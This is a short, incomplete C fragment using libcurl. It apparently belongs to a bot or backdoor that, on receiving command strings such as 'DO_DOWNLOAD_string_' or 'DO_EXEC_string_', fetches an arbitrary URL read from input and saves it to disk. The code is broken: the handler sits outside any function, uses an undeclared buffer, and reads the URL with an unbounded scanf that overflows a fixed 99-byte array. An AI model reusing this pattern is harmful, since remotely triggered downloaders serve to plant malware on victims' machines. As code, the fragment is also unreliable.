#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <curl/curl.h>

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}


if(strcmp(buf,"DO_DOWNLOAD_string_") == 0 || strcmp(buf,"DO_EXEC_string_") == 0){
  CURL *curl_handle;
  static const char *pagefilename = "downloadedfile";
  FILE *pagefile;
  char urlname[99] = "butts";
  scanf("%s", urlname);

  curl_global_init(CURL_GLOBAL_ALL);

  curl_handle = curl_easy_init();

  curl_easy_setopt(curl_handle, CURLOPT_URL, urlname);

  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);

  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);

  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);

  pagefile = fopen(pagefilename, "wb");
  if(pagefile) {

    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);

    curl_easy_perform(curl_handle);

    fclose(pagefile);
  }

  curl_easy_cleanup(curl_handle);

  curl_global_cleanup();

}
